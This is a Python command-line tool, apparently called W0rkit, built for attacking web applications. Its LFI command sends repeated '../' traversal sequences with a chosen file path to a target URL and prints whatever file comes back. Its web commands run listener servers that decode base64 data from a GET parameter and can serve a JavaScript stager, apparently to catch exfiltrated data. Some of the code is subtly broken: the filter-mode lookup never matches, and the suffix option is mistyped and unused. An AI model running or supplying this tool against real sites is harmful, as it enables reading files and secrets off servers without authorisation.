import click
from colorama import Fore, Back, Style, init as colorama_init
import requests


VERSION = "0.0.1"

colorama_init(autoreset=True)

lfi_modes_to_chars = {"spf": "....//", "default": "../"}


@click.group()
def main():
    print(f"W0rkit CLI {VERSION}")


@click.group()
def web():
    print(f"Web Mode!")


@main.group()
def lfi():
    print(f"LFI Mode!")


@lfi.command()
@click.option("-i", "--injectable", help="The full target where the LFI is present. (ex. http://vuln.site/?download=)", required=True)
@click.option("--fm", "--filter-mode", help="Specify here if the target is somehow filtering injection. (Current options: 'spf')")
@click.option("-s", "--suffix", help="Specify the suffix to be appended to the LFI payload. (e.g.: %00.pdf)", default="", type=click.types.INT)
@click.option("--rp", "--repeat-prefix", help="Specify how many times to repeat injection characters. default = 5 (enough to traverse out of most default webroots)", default=5)
def interrogate(injectable, filter_mode, suffix, repeat_prefix):
    injection_char = lfi_modes_to_chars.get("default")
    if filter_mode:
        injection_char = lfi_modes_to_chars.get("filter_mode", None)
    if not injection_char:
        click.secho("Invalid filter mode, defaulting to '../'")
        injection_char = lfi_modes_to_chars.get("default")

    injection_prefix = f"{injection_char}" * repeat_prefix

    try:
        while True:
            click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE} Enter Filepath (from : /) {Style.RESET_ALL}", nl=False)
            filepath = input()
            # Prepare full url
            target = f"{injectable}{injection_prefix}{filepath}"
            click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.LIGHTCYAN_EX} Trying to fetch: {Fore.LIGHTYELLOW_EX}{target}{Style.RESET_ALL}")
            with requests.Session() as _sess:
                resp = _sess.get(target)
                print(resp.text)
    except KeyboardInterrupt:
        click.secho(f"{Fore.LIGHTRED_EX} [SYS] CTRL + C Caught, exiting!")
        exit()


@web.command()
@click.option("-l", "--listen_address", help="Address the server should listen on.", required=True)
@click.option("-p", "--listen_port", help="Port to listen on.", required=True)
@click.option("-s", "--stager", is_flag=True, default=False, help="Enable the JS static web server")
def simple(listen_address, listen_port, stager):
    from w0rkit.web.simple_mode import app
    app.config['STAGER_ENABLED'] = stager

    showmode("Simple", listen_address, listen_port)
    click.secho(
        f"{Fore.CYAN}Stager: {f'{Fore.LIGHTGREEN_EX}ON' if stager else f'{Fore.LIGHTRED_EX}OFF'}{Style.RESET_ALL}")
    app.run(host=listen_address, port=listen_port)


@web.command()
@click.option("-l", "--listen_address", help="Address the server should listen on.", required=True)
@click.option("-p", "--listen_port", help="Port to listen on.", required=True)
@click.option("-m", "--magic_param", help="The GET parameter containing your base64 data.")
@click.option("-s", "--stager", is_flag=True, default=False, help="Enable the JS static web server")
def b64d(listen_address, listen_port, magic_param, stager):
    from w0rkit.web.simple_b64 import app
    if not magic_param:
        click.secho(f"{Fore.LIGHTYELLOW_EX}No magic param specified (-m)! Defaulting to '?q='{Style.RESET_ALL}")
        magic_param = "q"

    app.config['MAGIC_PARAM'] = magic_param
    app.config['STAGER_ENABLED'] = stager

    showmode("B64Decoder <3", listen_address, listen_port, magic_param=magic_param)
    click.secho(f"{Fore.CYAN}Stager: {f'{Fore.LIGHTGREEN_EX}ON' if stager else f'{Fore.LIGHTRED_EX}OFF'}{Style.RESET_ALL}")

    app.run(host=listen_address, port=listen_port)


def showmode(mode, host, port, **kwargs):
    click.secho(f"{Fore.LIGHTYELLOW_EX}{mode} {Fore.LIGHTCYAN_EX}mode. Running on {Fore.WHITE}{host}:{port}{Style.RESET_ALL}")

    # Magic param set?
    magic_param = kwargs.get('magic_param', None)
    if magic_param:
        click.secho(f"{Fore.LIGHTCYAN_EX}Checking parameter: {Fore.WHITE}{magic_param}")